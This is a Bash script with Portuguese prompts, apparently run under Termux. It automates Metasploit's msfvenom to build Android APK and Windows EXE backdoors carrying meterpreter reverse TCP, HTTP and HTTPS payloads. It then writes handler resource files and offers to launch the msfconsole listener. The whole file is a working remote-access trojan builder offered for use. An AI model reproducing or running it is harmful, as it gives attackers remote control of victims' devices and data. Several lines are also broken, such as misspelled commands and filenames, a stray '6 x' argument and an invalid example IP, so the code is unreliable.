#!/bin/bash
# Autor : olive
# Backdoors automatic platform Android, Windows
clear
ba=`setterm --foreground white`  
ve=`setterm --foreground green`  
Ve=`setterm --foreground red`    
cy=`setterm --foreground cyan`   
ye=`setterm --foreground yellow` 
az=`setterm --foreground blue`




banner() {
	setterm --foreground blue
	figlet Backdoor-apk
}


voltar() {
	echo "$Ve Voltando..."
	sleep 0.5
	bash $HOME/Backdoor-apk/backdoor.sh
}

sair() {
	echo "$Ve Saindo..."
	sleep 0.5
	exit
}


menu() {
	echo "$az          [00] $Ve->$ve Voltar"
	echo "$az          [99] $Ve->$ve Sair"
}

Menu_android() {
	echo "$az          [01] $Ve->$ve Payload->Tcp"
	echo "$az    	  [02] $Ve->$ve Payload->Http"
	echo "$az    	  [03] $Ve->$ve Payload->Https"
	echo "$az          [00] $Ve->$ve Sair"
}

menuPlatform() {
	echo "$az 1> Android"
	echo "$az 2> Windows"
	echo "$az 3> Sair   "
}

# Android

tcp_android() {
	if [ -e $HOME/Backdoor-apk/.AndroB/AndroB-tcp.rb ];then
		rm $HOME/Backdoor-apk/.AndroB/AndroB-tcp.rb
	fi
}

http_android() {
	if [ -e $HOME/Backdoor-apk/.AndroB/AndroB-http.rb ];then
		rm $HOME/Backdoor-apk/.AndroB/AndroB-http.rb
	fi
}
https_android() {
	if [ -e $HOME/Backdoor-apk/.AndroB/AndroB-https.rb ];then
		rm $HOME/Backdoor-apk/.AndroB/AndroB-https.rb
	fi
}

# windows

tcp_win() {
	if [ -e $HOME/Backdoor-apk/.WinB/WinB-tcp.rb ];then
		rm $HOME/Backdoor-apk/.WinB/WinB-tcp.rb
	fi
}
http_win() {
	if [ -e $HOME/Backdoor-apk/.WinB/WinB-http.rb ];then
		rm $HOME/Backdoor-apk/.WinB/WinB-http.rb
	fi
}
https_win() {
	if [ -e $HOME/Backdoor-apk/.WinB/WindB-https.rb ];then
		rm $HOME/Backdoor-apk/.WinB/WinB-https.rb
	fi
}




metasploitError() {
	echo "$Ver Metasploit not installed"
	exit
}

checkMeta() {
	echo "$ve Checkando metasploit..."
	sleep 2
}
MetaInstalled() {
	echo "$ve Metasploit Installed"
}

menu_Windows() {
	echo "
$az[01] $Ve->$ve Payload->Tcp
$az[02] $Ve->$ve Payload->Http
$az[03] $Ve->$ve Payload->Https
$az[00] $Ve->$ve Sair"
}

checkMeta

if [ -d $HOME/metasploit-framework ]
then
	MetaInstalled
	sleep 1
	clear
	banner
	echo ""
	menuPlatform
	echo ""
	echo "$az Escolha A opcao"
	echo ""
	read resp
	case $resp in
		"1" | "01") echo ''
			banner
			echo ""
			Menu_android
			echo -n "Backdoor-> "$Ve
			read backdoor
			case $backdoor in
				"01" | "1") echo ''
					echo "$ye Informe seu IP ifconfig"
					echo "$ye Exemplo, 192.168.0.13"
					echo -n "$ve Backdoor-> "$Ve
					read IP
					echo "$ye Informe a porta, recomendada 4444"
					echo -n "$ve Backdoor-> "$Ve
					read port
					echo "$ye Informe o caminho para o backdoor"
					echo "$ye exemplo... /sdcard/Download"
					echo -n "$ve Backdoor-> "$Ve
					read caminho
					termux-setup-storage
					echo  "$ye Informe um nome para o backdoor"
					echo -n "$ve Backdoor-> "$Ve
					read nome
					# Conexao reversa
					tcp_android
					http_android
					https_android
					# gerando...
					echo "$ye Gerando backdoor $nome.apk aguarde..."
					msfvenom=$HOME/metasploit-framework/msfvenom
					$msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$port R > $caminho/$nome.apk
					msfconsole=$HOME/metasploit-framework/msfconsole
					echo "$ye Backdoor $nome gerado em $caminho/$nome.apk"
					mkdir -p ~/Backdoor-apk/.AndroB
					cd $HOME/Backdoor-apk/.AndroB
					cat > AndroB-tcp.rb <<- end
					use exploit/multi/handler
					set PAYLOAD android/meterpreter/reverse_tcp
					set LHOST $IP
					set LPORT $port
					exploit -j
					end

					echo -n "$ve Deseja correr ao msfconsole? [s/n]> "
					read resp
					if test $resp = "s";then
						echo "$ve Aguarde..."
						$msfconsole -r AndroB-tcp.rb
					elif test $resp = "S";then
						echo "$ve Aguarde..."
						$msfconsole -r AndroB-tcp.rb
					else
						cd $HOME/Backdoor-apk
						echo "$Ve Finalizado..."
						exit
					fi;;
	
				"2" | "02") echo ''
					echo "$ye Informe seu IP ifconfig"
					echo "$ye Exemplo, 192.168.0.14"
					echo -n "$ve Backdoor-> "$Ve
					read IP
					echo "$ye Informe a port, recomendada 4444"
					echo -n "$ve Backdoor-> "$Ve
					read port
					echo "$ye Informe o caminho para o backdoor"
					echo "$ye Exemplo /sdcard/Download"
					echo -n "$ve Backdoor-> "$Ve
					read caminho
					termux-setup-storage
					echo "$ye Informe um nome para o backdoor"
					echo "$ye Exemplo: backdoor"
					echo -n "$ve Backdoor-> "$Ve
					read nome
					
					# Conexao reversa
					
					tcp_android
					http_android
					https_android
					# gerando...
					echo "$ye Gerando backdoor $nome.apk aguarde..."
					msfvenom=$HOME/metasploit-framework/msfvenom
					$msfvenom -p android/meterpreter/reverse_http LHOST=$IP LPORT=$port R > $caminho/$nome.apk
					msfconsole=$HOME/metasploit-framework/msfconsole
					echo "Backdoor $nome gerado em $caminho/$nome.apk"
					mkdir -p ~/Backdoor-apk/.A droB
					cd $HOME/Backdoor-apk/.AndroB
					cat > AndroB-http.rb <<- EOF
					use exploit/multi/handler
					set PAYLOAD android/meterpreter/reverse_http
					set LHOST $IP
					set LPORT $port
					exploit -j
					EOF
						
					echo -n "$ve Deseja correr ao msfconsole? [s/n]> "
					read resp
					if test $resp = "s";then
						echo "$ve Aguarde..."
						$msfconsole -r AndroB-http.rb
					elif test $resp = "S";then
						echo "$ve Aguarde..."
						$msfconsole -r AndroB-http.rb
					else
						cd $HOME/Backdoor-apk
						echo "$Ve Finalizado..."
						exit
					fi;;
				
	
				"3" | "03") echo ''
					echo "$ye Informe o IP ifconfig"
					echo "$ye Exemplo, 192.168.0.4.1"
					echo -n "$ve Backdoor-> "$Ve
					read IP
					echo "$ye Informe a port, recomendada 4444"
					echo -n "$ve Backdoor-> "$Ve
					read port
					echo "$ye Informe o caminho para o backdoor"
					echo "Exemplo, /sdcard/Download"
					echo -n "$ve Backdoor-> "$Ve
					read caminho
					termux-setup-storage
					echo "$ye Informe um nome para o backdoor"
					echo "$ye Exemplo, Backdoor"
					echo -n "$ve Backdoor-> "$Ve
					read nome
					
					# conexao reversa
					
					tcp_android
					http_android
					https_android
					
					# gerando...
					
					echo "$ye Gerando backdoor $nome.apk"
					msfvenom=$HOME/metasploit-framework/msfvenom
					$msfvenom -p android/meterpreter/reverse_https LHOST=$IP LPORT=$port R > $caminho/$nome.apk
					msfconsole=$HOME/metasploit-framework/msfconsole
					echo "$ye Backdoor $nome gerado em $caminho/$nome.apk"
					mkdir -p ~/Backdoor-apk/.AndroB
					cd $HOME/Backdoor-apk/.AndroB
					cat > AndroB-https.rb <<- EOF
					use exploit/multi/handler
					set PAYLOAD android/meterpreter/reverse_https
					set LHOST $IP
					set LPORT $port
					exploit -j
					EOF

					echo -n "$ve Deseja correr ao msfconsole? [s/n]> "
					read resp
					if test $resp = "s";then
						echo "$ve Aguarde..."
						$msfconsole -r AndroB-https.rb
					elif test $resp = "S";then
						echo "$ve Aguarde..."
						$msfconsole -r AndroB-https.rb
					else
						cd $HOME/Backdoor-apk
						echo "$Ve Finalizado..."
						exit
					fi;;
	
		
				"00" | "0") echo ''
					echo "$Ve Saindo..."
					sleep 0.5
					echo "$Ve Finalizado..."
					exit;;

			
				*)
			esac;;

		"2" | "02") echo ''
			sleep 1
			echo ''
			banner
			echo ""
			menu_Windows
			echo -n "Backdoor-> "$Ve
			read backdoor
			case $backdoor in
				"01" | "1") echo''
					echo "$ye Informe seu IP ifconfig"
					echo "$ye Exemplo, 192.168.0.13"
					echo -n "$ve Backdoor-> "$Ve 
					read IP
					echo "$ye Informe a porta, recomendada 4444"
					echo -n "$ve Backdoor-> "$Ve
					read port
					echo "$ye Informe o caminho para o backdoor"
                                	echo "$ye exemplo... /sdcard/Download"
					echo -n "$ve Backdoor-> "$Ve
					read caminho
					echo  "$ye Informe um nome para o backdoor"
                                	echo -n "$ve Backdoor-> "$Ve
					read nome

					# Conexao reversa

					# gerando...
					
					echo "$ye Gerando backdoor $nome.exe aguarde..."
					msfvenom=$HOME/metasploit-framework/msfvenom
					# 6 x > ~/Desktop/trojan.exe
					$msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$port 6 x > $caminho/$nome.exe
					msfconsole=$HOME/metasploit-framework/msfcosole
					echo "$ye Backdoor $nome gerado em $caminho/$nome.exe"
					mkdir -p ~/Backdoor-apk/.WinB
					cd $HOME/Backdoor-apk/.WinB

					cat > WinB-tcp.rb <<- EOF
					use exploit/multi/handler
					set PAYLOAD windows/meterpreter/reverse_tcp
					set LHOST $IP
					set LPORT $port
					exploit -j
					EOF

					echo -n "$ve Deseja correr ao msfconsole? [s/n]? "
					read resp
					if test $resp = "s";then
						echo "$ve Aguarde..."
						$msfconsole -r WinB-tcp.rb
					elif test $resp = "S";then
						echo "$ve Aguarde..."
						$msfconsole -r WinB-tcp.rb
					else    
						cd $HOME/Backdoor-apk
						echo "$Ve Finalizado..."
						exit
					fi;;

				"02" | "2") echo ''
					echo "$ye Informe seu IP ifconfig"
					echo "$ye Exemplo, 192.168.0.14"
					echo -n "$ve Backdoor-> "$Ve
					read IP
					echo "$ye Informe a port, recomendada 4444"
					echo -n "$ve Backdoor-> "$Ve
					read port
					echo "$ye Informe o caminho para o backdoor"
					echo "$ye Exemplo /sdcard/Download"
                             		echo -n "$ve Backdoor-> "$Ve
					read caminho
					echo "$ye Informe um nome para o backdoor"
					echo "$ye Exemplo: backdoor"
					echo -n "$ve Backdoor-> "$Ve
                                	read nome

					# Conexao reversa

					tcp_win
					http_win
					https_win

					# gerando...

					echo "$ye Gerando backdoor $nome.exe aguarde..."
					msfvenom=$HOME/metasploit-framework/msfvenom
					$msfvenom -p windows/meterpreter/reverse_http LHOST=$IP LPORT=$port 6 x > $caminho/$nome.exe
					msfconsole=$HOME/metasploit-framework/msfconsole
					echo "Backdoor $nome gerado em $caminho/$nome.exe"
					cd $HOME/Backdoor-apk/.WinB
					cat > WinB-http.rb <<- EOF
					use exploit/multi/handler
					set PAYLOAD windows/meterpreter/reverse_http
					set LHOST $IP
					set LPORT $port
					exploit -j
					EOF

					echo -n "$ve Deseja correr ao msfconsole? [s/n]> "
					read resp
					if test $resp = "s";then
						echo "$ve Aguarde..."
						$msfconsole -r WinB-http.rb
					elif test $resp = "S";then
						echo "$ve Aguarde..."
						$msfconsole -r WinB-http.rb
					else
						cd $HOME/Backdoor-apk
						echo "$Ve Finalizado..."
						exit
					fi;;

				"3" | "03") echo ''
					echo "$ye Informe o IP ifconfig"
					echo "$ye Exemplo, 192.168.0.4.1"
					echo -n "$ve Backdoor-> "$Ve
					read IP
					echo "$ye Informe a port, recomendada 4444"
					echo -n "$ve Backdoor-> "$Ve
					read port
					echo "$ye Informe o caminho para o backdoor"
					echo "Exemplo, /sdcard/Download"
					echo -n "$ve Backdoor-> "$Ve
					read caminho
					echo "$ye Informe um nome para o backdoor"
					echo "$ye Exemplo, Backdoor"
                               		echo -n "$ve Backdoor-> "$Ve
					read nome

					# conexao reverse
					
					tcp_win
					http_win
					https_win
					
					# gerando...
					
					echo "$ye Gerando backdoor $nome.exe"
					msfvenom=$HOME/metasploit-framework/msfvenom
					$msfvenom -p windows/meterpreter/reverse_https LHOST=$IP LPORT=$port R > $caminho/$nome.exe
					msfconsole=$HOME/metasploit-framework/msfconsole
					echo "$ye Backdoor $nome gerado em $caminho/$nome.exe"
					mkdir -p ~/Backdoor-apk/.WinB
					cd $HOME/Backdoor-apk/.WinB
					cat > WinB-https.rb <<- EOF
					use exploit/multi/handler
					set PAYLOAD windows/meterpreter/reverse_https
					set LHOST $IP
					set LPORT $port
					exploit -j
					EOF

					echo -n "$ve Deseja correr ao msfconsole? [s/n]> "
					read resp
					if test $resp = "s";then
						echo "$ve Aguarde..."
                                        	$msfconsole -r WinNB-https.rb
                                	elif test $resp = "S";then
						echo "$ve Aguarde..."
                                        	$msfconsole -r WinB--https.rb
					else
						cd $HOME/Backdoor-apk
						echo "$Ve Finalizado..."
                                        	exit
                                	fi;;

				"0" | "00") echo ''
					echo "$Ve Saindo..."
					sleep 1
					echo "$Ve Finalizado..."
					exit;;
				*)
			esac;;
		"3" | "03") echo ''
			echo "$Ve Finalizado..."
			sleep 1;;
		*)
	esac
else
	metasploitError
fi
